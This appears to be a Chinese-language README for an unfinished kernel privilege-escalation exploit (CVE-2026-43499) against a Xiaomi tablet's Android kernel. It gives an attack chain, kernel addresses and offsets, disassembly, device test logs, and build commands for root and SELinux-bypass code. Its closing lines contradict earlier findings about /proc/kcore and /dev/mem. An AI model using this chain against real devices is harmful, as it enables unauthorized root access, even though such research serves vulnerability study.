<p align="center">
  <b>语言 / Language:</b>
  &nbsp;🇨🇳 中文（当前） &nbsp;|&nbsp; <a href="README_EN.md"><b>🇬🇧 English</b></a>
</p>

---

# CVE-2026-43499 (GhostLock) — XRing O1 利用研究

> 目标: Xiaomi Pad 7 Ultra (jinghu), XRing O1 SoC
> 内核: 6.6.77-android15-8-g5770c661275f-abogki443185593-4k
> 性质: 内核安全研究 / 漏洞利用技术研究

## 攻击链

```
[1] kernelsnitch 泄露 mm_struct (futex hash 侧信道)
    ↓ 不依赖任何设备接口, 纯侧信道
[2] prepare_good_kernel_page 堆喷射 (fake_task/fake_w0/fake_fops)
    ↓ skb spray 到内核 SLUB
[3] futex_wait_requeue_pi 留下 dangling pi_blocked_on (栈 UAF)
    ↓ rt_mutex_cleanup_proxy_lock 跳过 remove_waiter
[4] pselect 复用同一栈, core_sys_select 覆盖 waiter 字段
    ↓ waiter->lock = &pselect_user_lock (用户空间, PAN 不阻止)
[5] consumer sched_setattr 触发 rt_mutex_adjust_prio_chain
    ↓ PI 链: waiter→lock→owner(fake_task)→fake_w0.pi_tree
[6] rb_insert 写入 *(target) = &栈waiter.pi_tree_entry (栈地址, 非可控值!)
    ↓ 只能写栈地址, 不能直接写 0/init_cred
[7] 让 pi_blocked_on 指向 spray 页面的 fake_w0 + 伪造 cred → 写指针槽 = &fake_w0.pi_tree_entry
    ↓ task->cred/real_cred 指向伪造 cred (uid=0) → root
```

## 真机测试进度 (2026-07-18)

分阶段测试 (test_minimal.so STAGE 1-7):

| 阶段 | 测试内容 | 结果 |
|---|---|---|
| STAGE 1 | 基础初始化 (disable_rseq/set_limit/pin_to_core) | OK |
| STAGE 2 | futex 基础 (FUTEX_LOCK_PI/UNLOCK_PI) | OK |
| STAGE 3 | kernelsnitch_setup (cpu_count=10) | OK |
| STAGE 4 | clone_leak_child (find_collisions) | OK |
| STAGE 5 | bruteforce 泄露 mm_struct | OK ★ 泄露成功 |
| STAGE 6 | prepare_good_kernel_page (spray) | OK ★ 页面准备好 |
| STAGE 7 | run_main_route_threads (PI 链触发) | OK ★ consumer 40次成功 |

**kernelsnitch 泄露的 mm_struct 地址示例**: ffffff80186c5500, ffffff8109969400, ffffff818fe72d00

**PI 链触发日志**:
```
pselect returned attempt=1 ret=0 errno=0 calls=40 success=40 delay=50000
```

## 当前卡点 (2026-07-18 已确认)

### 1. PI 链写入值是栈地址, 不是 write_pc (已确认, 最关键)

**反汇编 chain_disasm.txt 确认**: `rt_mutex_adjust_prio_chain` 的 rb_insert (行193) 写的是 `str x25, [x11, x13]`,
其中 x25 = `task->pi_blocked_on` 指向的 waiter 的 pi_tree_entry 地址 (栈地址)。

**真机验证** (STAGE=7, 栈 painting val=0):
```
CMP_REQUEUE_PI ret=1       ← UAF 触发
waiter WAIT_REQUEUE_PI ret=0 ← UAF 确认
stack-painted val=0 tgt=SELINUX_ENFORCING-8  ← 栈 painting 正确
pselect returned calls=40 success=40  ← PI 链触发
enforce AFTER=1 (仍 Enforcing)  ← 写入失败 (栈地址非0)
```

**结论**: PI 链写入原语**只能写栈地址**, 无法写 0 或 init_cred。这正是采用"两次 walk + 伪造 cred"方案的原因。

### cred 直写路线的含义

```
walk#1: *(task->real_cred) = &fake_w0.pi_tree_entry (spray 页面已知地址)
walk#2: *(task->cred)      = &fake_w0.pi_tree_entry
        其中 fake_w0 页面伪造了 cred 结构 (uid/gid/euid/suid/fsuid/egid/sgid/fsgid=0, cap=0)
```

要让写入可控: 让 `task->pi_blocked_on` 指向 **spray 页面的 fake_w0** (而非栈 waiter),
这样 x25 = &fake_w0.pi_tree_entry (已知地址), 且 fake_w0 页面可伪造 cred。

### 2. mm_struct → task_struct (读 mm->owner)

kernelsnitch 泄露的是 mm_struct 地址。要写 task->cred 需要知道 task_struct 地址, 这需要读 mm_struct + 0x408 (mm->owner)。

**所有已知内核读路径都不可用, 根因是 ashmem SELinux 墙 (详见下方团队对比)**:
- configfs_read_once **代码本身已正确** (与团队版本逐字相同, 设 CFG_PAGE_OFF + pos 读), 但它需要一个 **ashmem fd** 来承载 target 地址
- `/dev/ashmem` 权限 666 但 SELinux 拦截 shell 域 open (Permission denied) → configfs 读 / pipe physrw 全部饿死
- /proc/self/stat 的 kstkesp=0 (kptr_restrict)
- BPF/debugfs 不可读, perf_event 被 SELinux 拒 (`{ kernel }` tclass=perf_event)

可用资源: **/dev/uhid (crw-rw-rw-, shell 域可 open, 已验证 fd=3)** — 见下方 "团队对比 + uhid 突破方向"。

> **★ 2026-07-19 更深一层认知** (见上方"当前卡点 2026-07-19 重新定位 §A"):
> ashmem 墙**不是整条 cred 直写链的真正 blocker**, 只是 configfs_read_once 这条特定读链的 blocker。
> 整条链真正卡在 **waiter_thread 的 task_struct 地址未知** —— 即使绕开 ashmem, 也还需要任意内核读才能 `mm->owner → task_struct`。
> 必须用漏洞原语做 task_struct 泄露。当前最大认知空白: **task_struct 地址泄露方法** 仍待突破。

### 3. ashmem SELinux 拦截 (configfs_read_once 读链的 blocker)

`/dev/ashmem` 权限 666 但 SELinux 拦截 shell 域 open。后果:
- 阻止 fops 路线的 configfs 验证
- 阻止团队的整个后段 (pipe physrw 任意 RW + install_android_root 也建立在 configfs_read_once 之上)
- 阻止 cred 直写当前框架的 `leak_task_struct` 走 kread_* 路径

但根据 2026-07-19 重新审计, **ashmem 墙不是整条利用链的真正 blocker** —— 即使解决 ashmem (例如以 App 域运行), 仍需解决 task_struct 地址泄露问题才能完成 cred 直写。`docs/p1_code_gap.md` §3 给出新认识。

### ★ 团队对比 (ayyy7128/CVE-2026-43499-jinghu) + uhid 突破方向

已克隆并逐文件分析团队报告 (详见 `docs/team-compare.md`), 关键结论:

1. **双方内核同一构建, 偏移完全对齐** (init_task/init_cred/selinux/ashmem_misc_fops 一致), KASLR=0。
2. **双方卡在完全相同的位置**: configfs_read_once 代码已一致且正确, 但 ashmem fd 在 shell 域被 SELinux 拒 → configfs 读返回 0。团队 PROGRESS.md 自认 "configfs 读仍 rd=0"。
3. **团队的 /dev/mem fallback 在 Android 不可行** (CONFIG_STRICT_DEVMEM)。
4. **突破方向 — uhid fops 重定向**: `/dev/uhid` 是 `crw-rw-rw-` 且 shell 域**可 open** (我们 uhid_test.c 已验证 fd=3), 而 /dev/ashmem 不行。KASLR=0 → `uhid_fops` 地址已知 → GhostLock 写入原语可把 `uhid_fops` 指向 spray 页面 fake fops, 然后 open("/dev/uhid") 触发劫持 → 任意内核 RW, 从而绕过 ashmem缺少的读原语。
   - caveat: 团队的 configfs 任意读依赖 ashmem 专属 name blob 机制, uhid 没有, 需为 uhid fd 另找 `.read`/`.unlocked_ioctl` 的任意 RW gadget。这是**最有价值的未验证假设**, 待设备重连实验。

## 当前卡点 (2026-07-19 重新定位)

> 离线反汇编持续深挖, 推翻了几条早期结论。下面是经过 2026-07-19 整轮审计后的最新认知。详情见 `docs/` 下的四份新报告。

### ★ A. 真正的 blocker 不是 ashmem, 是 task_struct 地址未知

2026-07-18 的卡点描述把 ashmem SELinux 墙当作"真实 blocker", 这是当时视角下看到的最近一层墙。
深挖后 ashmem 墙**只是 configfs_read_once 读链失效的原因**, 不是整条利用链的 blocker。

整条 cred 直写链路真正的卡点是: **waiter_thread 的 task_struct 地址未知**。

PI 链写入的 target 是任意可控的 (`set_pselect_write(target-8, ...)`), 但要写 `task->cred` 必须设 `target = task + 0x820`, 而 **task_struct 地址必须先泄露出来**。

| 候选 | 状态 | 出处 |
|---|---|---|
| /proc/kcore + /dev/mem | ✗ 文件不存在 (CONFIG_PROC_KCORE/DEVMEM=n) | `p1_code_gap.md` |
| binder ioctl (含 BINDER_GET_NODE_DEBUG_INFO) | ✗ 只泄 binder_node.ptr, 非 task_struct | `task_struct_leak_survey.md` |
| fanotify | ✗ CONFIG_FANOTIFY **未编入** jinghu 内核 (符号数=0) | `task_struct_leak_survey.md` |
| inotify | ✗ inotify_event 全 32-bit int, 无内核指针 | `task_struct_leak_survey.md` |
| procfs (stat/wchan/status/statm) | ✗ kptr_restrict=1 + seq_printf ASCII 转义 | `task_struct_leak_survey.md` |
| kernelsnitch 扩展 | ✗ futex_hash 第二参数硬编码 `current->mm` | `kernelsnitch_task_leak.md` |
| mm->owner (+0x408) 反推 | ✗ 需任意内核读, 死结 | `p1_code_gap.md` |
| init_task + pid 遍历 | ✗ 需任意内核读, 死结 | `p1_code_gap.md` |

**所有标准通道都拿不到 task_struct 指针** —— 这是现代 Android 内核的设计意图 (`kptr_restrict=1` + SELinux + DEVMEM/PROCKCORE/FANOTIFY 未开 + binder 只暴露 desc 不暴露 raw 指针)。必须用漏洞原语做泄露。

### ★ B. spray fake cred 方案（重要认知纠正）

之前文档说"写 task->cred = init_cred"是**简化描述**。反汇编 (`RESEARCH_NOTES/rb_insert_analysis.md:220-222`) 明确: PI 链写入的"值"是**节点地址**, 不是任意值。

正确的实现方式:

```
1. 让 task->pi_blocked_on 指向 spray 页面的 fake_w0 (而非栈 waiter)
2. rb_insert 写入值 = &fake_w0.pi_tree_entry (spray 页面已知固定地址)
3. 设 target = task->real_cred → *(task->real_cred) = &fake_w0.pi_tree_entry
4. 设 target = task->cred      → *(task->cred)      = &fake_w0.pi_tree_entry
5. 在 fake_w0 页面里伪造完整 struct cred (内容复制自 init_cred, uid/gid/euid=0, cap 全开)
6. 内核访问 task->cred->uid 等字段时, 实际是从 fake_w0 的 pi_tree_entry 之后那块读
```

**所以正确方案是让 cred 指向 spray 页里伪造的 cred**, 不是直接挂内核的 init_cred。这一点对当前代码的影响见 `docs/p1_code_gap.md` §4-5。

### ★ C. 项目最大认知空白 = task_struct 地址泄露方法

waiter_thread 的 task_struct 地址必须泄露才能完成 cred 直写 (PI 链 target = task + 0x820)。但前述所有 leak 候选已被排除, 具体方案仍有待研究突破。

详情见 `docs/kernelsnitch_task_leak.md` §6 "下一步推荐"。最高杠杆的待办 = **重新审视利用链各步骤, 寻找 task_struct 泄露路径**。

### ★ D. PI 链写入的两个分支 (chain_disasm.txt 复核)

`rt_mutex_adjust_prio_chain` 有两条 rb_insert 写入路径, 走哪条取决于链上节点位置:

| 行 | 指令 | 写入值 | 含义 |
|---|---|---|---|
| 193 | `ffffffc081052b50: str x25, [x11, x13]` | `x25 = task->pi_blocked_on` 指向的 waiter 自身 (= `&pi_tree_entry - 0x28`) | parent child 槽指向 waiter |
| 409 | `ffffffc081052eb0: str x0, [x11, x13]` | `x0 = x25 + 0x28` (= `&pi_tree_entry`) | parent child 槽指向 &pi_tree_entry |

可控化后 (pi_blocked_on → spray fake_w0), 两支写入值都是 spray 页固定已知地址, 仅差 0x28 偏移。
**伪 cred 起点必须对齐到分支实际写入值**: 是 `fake_w0` 还是 `fake_w0+0x28`, 需在真机验证 (二选一, 不确定时按 `fake_w0` 起点摆, 再偏移试错)。

### ★ E. uhid fops 路线不是"任意读银弹"

`docs/uhid_gadget_survey.md` 反汇编结论:

- `uhid_misc = 0xffffffc082234fc0`, `uhid_misc.fops = 0xffffffc082234fd0` (miscdevice + 0x10), `write_left = 0xffffffc082234fc8`
- `uhid_fops.unlocked_ioctl = 0` → uhid 不走 ioctl, 命令走 `.write` 路径
- `put_fake_fops_table` 现版本 (util.c:302+) 在 `FOPS_READ_OFF` 填的是 PI-tree 节点指针 (非函数指针), 用在 uhid 上 open() 即 KCFI panic
- **KCFI 约束**: `copy_from_kernel_nofault` / `bin2hex` / `simple_read_from_buffer` 原型与 VFS handler 不匹配, 不能直接塞 fops 槽 → 跨原型必 panic
- **结论**: uhid 路线本身只验证 PI chain 对 miscdevice::fops 写入有效; 任意读还得另寻路径。**它不是任意读银弹**。

### 新增 docs 文件 (2026-07-19)

| 文件 | 内容 |
|---|---|
| `docs/p1_code_gap.md` | 审 main_cred.c/util.c/target.h 当前状态 → P1 距离完成还差 5 件事 + 真正 blocker 定位 |
| `docs/kernelsnitch_task_leak.md` | 审 kernelsnitch 源码 → 不能扩展为泄 task_struct + spray fake cred 认知纠正 + 项目最大认知空白 |
| `docs/task_struct_leak_survey.md` | 反汇编 binder/fanotify/inotify/procfs 四条标准通道 → 全部排除 (含反汇编证据) |
| `docs/uhid_gadget_survey.md` | 反汇编 uhid fops 表 + KCFI 约束 → 不能直接挂 helper 函数指针做任意读 |

## 踩的坑

### 坑 1: configfs_read_once 失效根因 = ashmem SELinux 墙 (非代码 bug, 非 Android 16 修补)

反汇编 configfs_bin_read_iter (0xffffffc080488c9c) 确认 CFG_* 偏移正确 (0x50/0x58/0x60/0x64 完全匹配)。
**但 configfs_read_once 代码本身是正确可用的** (与团队版本逐字相同, 设 CFG_PAGE_OFF + pos 读) — 早期 "代码 bug (needs_read_fill=0 不设 buffer_size)" 是对更老版本的误判, 当前代码已修正。

真机返回 0 的**真正原因**: configfs_read_once 需要 ashmem fd 承载 target (ASHMEM_SET_NAME), 而 **/dev/ashmem 在 shell 域被 SELinux 拒绝 open**。fd 打不开 → read 返回 0。
团队 PROGRESS.md 同样自认 "configfs 读仍 rd=0"。早期文档 "Android 16 已修补 configfs" 是误判 — 是 SELinux 策略挡了 shell 域的 ashmem open。

### 坑 2: 路线偏差 (fops 劫持 vs cred 直写)

- cred 直写路线: mm leaked → 两次 walk 写 task->cred/real_cred = `&fake_w0.pi_tree_entry` (spray 页面伪造 cred, 内容复制自 init_cred; 见上方"§B 认知纠正")
  - 注: 早期说法"= init_cred"是简化描述, 反汇编确认 PI 链写入原语只能写节点地址, 不能直写 init_cred 指针
- jinghu 早期走 fops 劫持: 写 ashmem_misc_fops → configfs 验证 → leak_kernel_base → install_root
- fops 路线依赖 configfs (致命依赖), cred 直写更简洁

### 坑 3: page_base=0 问题

test_minimal STAGE 6 设置了 page_base, 但 STAGE 7 do_pselect_fake_lock_route 看到的是 0。原因不明 (可能多线程可见性或编译器优化)。解决: STAGE 7 重新调 prepare_good_kernel_page。

### 坑 4: pr_error 调 exit(-1)

SYSCHK 失败时 pr_error 调 exit(-1), 导致 ashmem open 失败后进程退出, 无法看到后续结果。解决: 重定义 pr_error 不 exit, 或改 open_ashmem_device 不 SYSCHK。

### 坑 5: rt_mutex_waiter 布局

反汇编验证: pi_tree_entry 在 +0x28 (不是 +0x18), 多了 prio/deadline 字段。fake_task.pi_blocked_on 必须指向 fake_w0 结构体起始 (非 pi_tree_entry), 否则第二跳读 lock 字段错位。

### 坑 6: pselect 不阻塞

readfds 全零 + exceptfds=NULL → do_select 无 fd 检查立即返回 ret=0。修复: exceptfds 设 pipe read end, pselect 阻塞到 timeout。

## 关键数据

### 地址 (KASLR=0, vmlinux→runtime 减 0xc080000000)
```
KIMAGE_TEXT_BASE  = 0xffffffc080000000
init_task         = 0xffffff80020de280
init_cred         = 0xffffff80020f0548
selinux_state     = 0xffffff8002315f68
ashmem_misc_fops  = 0xffffff800223b5e8
uhid_fops         = 0xffffffc0812bb120   (const struct file_operations)
uhid_misc         = 0xffffffc082234fc0   (struct miscdevice)
uhid_misc.fops    = 0xffffffc082234fd0   (= uhid_misc + 0x10, 当前指向 uhid_fops)
```
**uhid fops 劫持目标 (绕过 ashmem SELinux 墙)**: `write_left = uhid_misc.fops - 8 = 0xffffffc082234fc8`
→ GhostLock 写 `*(0xffffffc082234fd0) = &fake_w0.pi_tree_entry` (spray 页面) → open("/dev/uhid") 触发劫持。

### task_struct 偏移
```
cred=+0x818  real_cred=+0x820  pi_blocked_on=+0x938
pi_waiters=+0x920  real_parent=+0x628  comm=+0x830
```

### mm_struct 偏移
```
owner=+0x408 (MM_OWNER_OFF)
```

### rt_mutex_waiter 布局 (反汇编验证)
```
+0x00 tree_entry (rb_node 24B)
+0x18 prio (u32)
+0x20 deadline (u64)
+0x28 pi_tree_entry (rb_node 24B) ← PI 树遍历用此
+0x40 pi_prio (u32)
+0x50 task (ptr)
+0x58 lock (ptr) ← 关键字段
```

### 写入原语 (已确认)
```
set_pselect_write(target-8, value, 0)
→ fake_w0.pi_tree.rb_left = target-8
→ fake_w0.pi_tree.__rb_parent_color = value
→ PI 链 rb_insert: *(target) = &栈waiter.pi_tree_entry (栈地址, 非 value!)
```

要让写入可控: 让 task->pi_blocked_on 指向 spray 页面的 fake_w0 (而非栈 waiter),
则 rb_insert 写 &fake_w0.pi_tree_entry (已知地址), 且 fake_w0 页面可伪造 cred。

### 反汇编关键函数
```
ashmem_open            = 0xffffffc080c7af5c (struct ashmem_area=0xdc0, name@+0x0)
configfs_bin_read_iter = 0xffffffc080488c9c
configfs_read_iter     = 0xffffffc080488978
rt_mutex_adjust_prio_chain   = 0xffffffc081052868 (rb_insert 行193: str x25,[x11,x13])
rt_mutex_cleanup_proxy_lock  = 0xffffffc081052634 (owner==current 跳 remove_waiter)
task_blocks_on_rt_mutex      = 0xffffffc081051c08 (★ task->pi_blocked_on=waiter @+0x938)
try_to_take_rt_mutex         = 0xffffffc081051820 (取锁写 pi_tree_entry)
remove_waiter                = 0xffffffc0810520f0 (清理 pi_blocked_on=NULL)
```

## rb_insert / PI 链写入路径 逆向分析 (2026-07-18)

工具: android-ndk-r27d 的 `llvm-objdump` / `llvm-nm` 对 `vmlinux_extracted` (ELF64 aarch64, not stripped, 41.6MB) 反汇编。完整报告见 `RESEARCH_NOTES/rb_insert_analysis.md`, 反汇编产物见 `RESEARCH_NOTES/disasm/`。

### 关键结论

| 项目 | 结论 |
|------|------|
| rb_insert 是否有独立符号 | 否。内核实现为 `__rb_insert_augmented` (0xffffffc08102dd40)。PI 树插入靠 `rb_insert_color` (0xffffffc08102d91c) 再平衡, 链入在调用者 `stp xN,xzr,[node,#0x28]` 那一步 |
| PI 树节点连接字段 | waiter 的 **`pi_tree_entry` @ +0x28** (非 tree_entry +0x00) |
| rb_insert 写入目标 | 被插入节点 pi_tree_entry 的地址 (`&waiter->pi_tree_entry`), 不是任意值 |
| 漏洞触发源头 | `task_blocks_on_rt_mutex` @ 0xffffffc081051d40: `str x21,[x20,#0x938]` → **task->pi_blocked_on = waiter** |
| cleanup 跳过 remove_waiter | `rt_mutex_cleanup_proxy_lock` 当 `owner==current` 时 (x20==SP_EL0) 不调 remove_waiter, pi_blocked_on 残留指向栈 waiter |
| 栈覆盖点 | `core_sys_select` `sub sp,#0x1f0`, do_select 在帧内调用, pselect 二次进入时寄存器保存覆盖 waiter 字段 |

### task_blocks_on_rt_mutex — 把 waiter 挂入树并写 pi_blocked_on

```
ffffffc081051d04: stp x12, xzr, [x21]              // waiter->rb_parent_color = parent
ffffffc081051d0c: str x21, [x12, x15]             // 父节点->child = waiter
ffffffc081051d30: str x21, [x19, #0x10]           // lock->waiters.rb_node = waiter (树空时)
ffffffc081051d34: mov x0, x21
ffffffc081051d38: bl rb_insert_color              // 上色再平衡
ffffffc081051d40: str x21, [x20, #0x938]          // ★ task->pi_blocked_on = waiter
```

把 waiter 的 pi_tree_entry (+0x28) 插入 owner 的 pi_waiters:
```
ffffffc081051e34: add x0, x21, #0x28              // ★ x0 = &waiter->pi_tree_entry (+0x28)
ffffffc081051e98: stp x11, xzr, [x21, #0x28]      // waiter->pi_tree_entry.rb_parent_color = x11
ffffffc081051eb8: str x0, [x22, #0x928]           // owner->pi_waiters.rb_leftmost = &waiter->pi_tree_entry
ffffffc081051ec0: bl rb_insert_color
```

### try_to_take_rt_mutex — 取锁时也写 pi_tree_entry

current 成功取锁时, 把栈顶 waiter 的 pi_tree_entry 插入 current 的 pi_waiters:
```
ffffffc081051a38: stp x12, xzr, [x8, #0x28]       // ★ waiter->pi_tree_entry.rb_parent_color = x12
ffffffc081051a40: str x0, [x12, x15]              // 父->child = &waiter->pi_tree_entry
ffffffc081051a58: str x0, [x20, #0x928]           // current->pi_waiters.rb_leftmost = &waiter->pi_tree_entry
ffffffc081051a5c: bl rb_insert_color
```

### rt_mutex_cleanup_proxy_lock — 跳过 remove_waiter 的分支 (★ 漏洞本身)

```
ffffffc081052654: mrs x20, SP_EL0                 // x20 = current (SP_EL0 指向 current task)
ffffffc081052664: bl try_to_take_rt_mutex
ffffffc081052668: ldr x8, [x19, #0x18]            // lock->owner
ffffffc08105266c: and x22, x8, #~1               // owner = lock->owner & ~1
ffffffc081052670: cmp x22, x20                    // owner == current ?
ffffffc081052674: b.eq +0x50                      // ★ 若 owner==current, 跳过 remove_waiter!
ffffffc081052680: bl remove_waiter                // 否则正常清理 pi_blocked_on
```

### remove_waiter — 正常清理 (被跳过则不执行)

```
ffffffc081052178: str xzr, [x20, #0x938]          // ★ task->pi_blocked_on = NULL (清理!)
```

### core_sys_select — 栈布局与覆盖

```
ffffffc0803dfdf8: sub sp, sp, #0x1f0              // 496 字节栈帧
ffffffc0803dfe14: add x29, sp, #0x190            // 帧基
```

do_select 在帧内被调用 (`bl do_select`), 栈寄存器保存区在 sp+0x190~0x1e0; 栈复用区 sp+0x80~0x190 被 pselect 二次进入时的寄存器保存 / memset 覆盖 → 覆盖原 waiter 的 prio/deadline/task/lock 字段。这正是"pselect 复用同一栈区域, core_sys_select 保存寄存器覆盖 waiter 字段"的硬件基础。

### 反汇编产物 (RESEARCH_NOTES/disasm/)

| 文件 | 函数 | 地址 |
|------|------|------|
| rb_insert_color.disasm.txt | rb_insert_color | 0xffffffc08102d91c |
| __rb_insert_augmented.disasm.txt | __rb_insert_augmented (内核 rb_insert) | 0xffffffc08102dd40 |
| rb_erase.disasm.txt | rb_erase | 0xffffffc08102da44 |
| rb_erase_cached.disasm.txt | rb_erase_cached | 0xffffffc080128074 |
| rb_first/next/prev.disasm.txt | rb_first/next/prev | 0xffffffc08102df00~ |
| task_blocks_on_rt_mutex.disasm.txt | task_blocks_on_rt_mutex | 0xffffffc081051c08 |
| try_to_take_rt_mutex.disasm.txt | try_to_take_rt_mutex | 0xffffffc081051820 |
| rt_mutex_start_proxy_lock.disasm.txt | rt_mutex_start_proxy_lock | 0xffffffc081052058 |
| remove_waiter.disasm.txt | remove_waiter | 0xffffffc0810520f0 |
| rt_mutex_cleanup_proxy_lock.disasm.txt | rt_mutex_cleanup_proxy_lock | 0xffffffc081052634 |
| rt_mutex_adjust_prio_chain.disasm.txt | rt_mutex_adjust_prio_chain | 0xffffffc081052868 |
| rt_mutex_setprio.disasm.txt | rt_mutex_setprio | 0xffffffc0800f1f6c |
| core_sys_select.disasm.txt | core_sys_select | 0xffffffc0803dfdf4 |

完整报告: `RESEARCH_NOTES/rb_insert_analysis.md`。

## 待办 (需要做的工作)

### 优先级 0: ★ task_struct 地址泄露 (2026-07-19 重新定位的最高优先级)

cred 直写链路的真正卡点是 **waiter_thread 的 task_struct 地址未知**。
PI 链 target 任意可控, 但要写 `task->cred` 必须知道 task_struct 地址 (`target = task + 0x820`)。

最高杠杆的下一步 = **重新审视利用链各步骤, 寻找 task_struct 泄露路径**。
- 详见 `docs/kernelsnitch_task_leak.md` §6 / `docs/p1_code_gap.md` §6

备选方案:
- 反汇编 `rt_mutex_adjust_prio_chain` 全貌, 看 PI 链传播过程中是否有 task_struct 指针被写到可读处
- 设计全新侧信道扫 task_struct (task_struct 也在 direct map 区域, 理论可扫; 工程量大)

### 优先级 1: 让写入原语可控 (pi_blocked_on → spray fake_w0)

当前 rb_insert 写栈地址。需让 `task->pi_blocked_on` 指向 spray 页面的 fake_w0:
- 栈 painting 覆盖栈 waiter 的 pi_blocked_on 字段 (+0x50) 指向 fake_w0
- 在 fake_w0 页面伪造 cred 结构 (uid/gid/euid/suid/fsuid/egid/sgid/fsgid=0, cap=0)
- **关键细节** (2026-07-19 chain_disasm 反汇编复核): PI 链有两条写入分支 (行 193 写 waiter 自身 / 行 409 写 `&pi_tree_entry`), 伪 cred 起点必须对齐分支实际写入值 (`fake_w0` 或 `fake_w0+0x28`), 需真机验证
- 两次 walk 写 real_cred/cred 指针槽 = &fake_w0 (或 fake_w0.pi_tree_entry)

**两个已知代码 BUG** (见 `docs/p1_code_gap.md`):
- BUG 1: `fake_w0+0x28` 当前填的是 pi_tree_entry 三字段 {write_pc, write_right, write_left}, 不是合法 cred → 需改成: write_pc=1/usage=1, write_right=0/gid=0, write_left=0/euid=0
- BUG 2: walk #2 期望写 `*(SELINUX_ENFORCING) = 0`, 但 PI 链写入值始终是节点地址 (非 0), 反而保持 enforcing → 应删除 walk #2, root 后用 `setenforce 0`

### 优先级 2: uhid fops 重定向 (PI chain 写入验证手段)

★ 2026-07-19 反汇编新认识: uhid 路线**不是任意读银弹**, 只是 PI chain 对 miscdevice::fops 写入的验证手段。
- 目标写入地址: `write_left = uhid_misc.fops - 8 = 0xffffffc082234fc8` (KASLR=0), 写入后 `*(0xffffffc082234fd0) = &fake_w0.pi_tree_entry`
- 然后 open("/dev/uhid") (已验证 shell 域可 open, fd=3) 触发 fops 劫持
- 需要重写 `put_fake_fops_table`: uhid 路线下整张 fake_fops 全填 uhid 原版函数指针 (CFI 不允许跨原型 helper, 不能塞 `copy_from_kernel_nofault` 等)
- 详见 `docs/uhid_gadget_survey.md`

### 优先级 3: child mm → parent task

kernelsnitch 在 clone_leak_child 里跑, 泄露的是 child mm。要写 parent cred, 需读 child task->real_parent (+0x628) 拿 parent task_struct。或改 kernelsnitch 在 parent 跑。

### 优先级 4: 多次 walk (slot 机制)

需要用两次 walk (slot_idx=1 写 real_cred, slot_idx=2 写 cred)。需实现 slot 机制。

### 优先级 5: brk #0x800 crash

rt_mutex_setprio 在 pi_blocked_on 非空路径触发 BUG (约 20 轮)。研究发现可用 csettle_us=500 (微秒级时序) 避免。

## 文件清单

```
share-poc-XRing-O1/
├── README.md              项目总览 (攻击链/进度/坑/关键数据/待办)
├── README_EN.md           英文版 (English version)
├── RESEARCH_NOTES.md      研究说明 (漏洞原理/技术路线/难点突破)
├── RESEARCH_NOTES/        rb_insert / PI 链写入路径逆向分析
│   ├── rb_insert_analysis.md  完整逆向报告 (12节: rb_insert/PI链/栈布局/原语判定)
│   └── disasm/                15个关键函数反汇编 (见下方"rb_insert / PI 链写入路径逆向分析")
├── docs/
│   ├── findings.md        关键发现汇总 (configfs bug/kernelsnitch工作/PI链写入问题)
│   ├── team-compare.md    ★ 团队报告对比 (ayyy7128) + uhid 突破方向
│   ├── p1_code_gap.md     ★ (2026-07-19) P1 代码审计: 距离 cred 直写完成还差 5 件事, 真正 blocker 定位
│   ├── kernelsnitch_task_leak.md  ★ (2026-07-19) kernelsnitch 扩展泄 task_struct 可行性: 不能 + spray fake cred 认知纠正
│   ├── task_struct_leak_survey.md ★ (2026-07-19) 反汇编 4 条标准通道 (binder/fanotify/inotify/procfs) 全部排除
│   └── uhid_gadget_survey.md  ★ (2026-07-19) uhid fops 反汇编 + KCFI 约束: 不是任意读银弹
├── src/                   完整源码 (可编译)
│   ├── test_minimal.c     分阶段测试程序 (STAGE 1-7 隔离 panic 点)
│   ├── main_cred.c        cred 直写框架 (run_exploit 3次walk写cred)
│   ├── target.h           jinghu 偏移配置 (地址/struct偏移)
│   ├── common.h           核心头文件 (全局变量声明/宏定义/extern声明)
│   ├── util.c             kernelsnitch封装 + prepare_kernel_page + configfs_read_once
│   ├── fops.c             do_pselect_fake_lock_route + PI链触发 + cfi验证
│   ├── slide.c            KASLR bypass (boot_id写入验证)
│   ├── pipe.c             pipe阶段 (install_pipe_physrw)
│   ├── root.c             install_android_root (提权后root安装)
│   ├── offset.h           target配置入口 (include target.h)
│   ├── su_daemon.c        su daemon (root shell服务)
│   ├── su_blob.S          嵌入su_daemon二进制 (.incbin,需build/embed/资源)
│   ├── wallpaper_blob.S   嵌入wallpaper二进制 (.incbin,需assets/资源)
│   └── kernelsnitch/      kernelsnitch leak核心实现 (futex hash侧信道)
│       ├── kernelsnitch.h  泄露mm_struct完整实现 (450行,bruteforce搜索)
│       ├── futex_hash.h    futex哈希函数 (hash桶计算)
│       ├── timeutils.h     时间测量工具 (rdtsc等)
│       └── utils.h         pr_info/pr_error/SYSCHK等宏定义
├── disasm/                关键函数反汇编 (从vmlinux_extracted提取)
│   ├── chain_disasm.txt   ★ rt_mutex_adjust_prio_chain (PI链核心!确认rb_insert写入值)
│   ├── do_select_disasm.txt   do_select (pselect栈布局,waiter覆盖位置)
│   ├── do_select_full_disasm.txt  do_select完整反汇编
│   ├── core_sys_select_disasm.txt  core_sys_select (保存寄存器覆盖waiter字段)
│   ├── futex_requeue_full.txt  futex_wait_requeue_pi完整流程 (栈UAF触发)
│   ├── futex_wait_requeue_pi_full.txt  futex_wait_requeue_pi (漏洞触发点)
│   └── adjust_pi_disasm.txt  rt_mutex_adjust_pi (PI链入口)
└── refs/                  参考数据
    ├── kallsyms.txt       内核符号表 (766字节,部分关键符号)
    └── kernel_config.txt  内核配置 (219KB,/proc/config.gz提取)
```

### 编译说明

su_blob.S/wallpaper_blob.S 的 .incbin 资源 (build/embed/su_daemon_aarch64_pie, assets/wallpaper.webp) 未包含在仓库中。编译需要从 CyberMeowfia 上游 (IonStack/CVE-2026-43499/exploit/) 获取这两个资源文件。

编译命令:
```bash
# 需在 CyberMeowfia/exploit 目录下 (提供 incbin 资源)
NDK=android-ndk-r27d/toolchains/llvm/prebuilt/windows-x86_64
clang --target=aarch64-linux-android35 --sysroot=$NDK/sysroot \
  -O2 -fPIC -I src -DTARGET_CONFIG_H="targets/jinghu/target.h" \
  src/test_minimal.c src/main.c src/util.c src/slide.c src/fops.c \
  src/pipe.c src/root.c src/su_blob.S src/wallpaper_blob.S \
  -shared -o test_minimal.so -pthread -fuse-ld=lld
```

### cred 直写路线编译 (本项目主线)

`src/main_cred.c` 是 cred 直写框架 (3 次 walk 写 real_cred/cred/selinux).
`util.c` 已加入独立内核读后端 `kread_*` (/proc/kcore 或 /dev/mem),
供 `leak_task_struct()` 把 mm_struct → task_struct (不依赖失效的 ashmem/configfs).

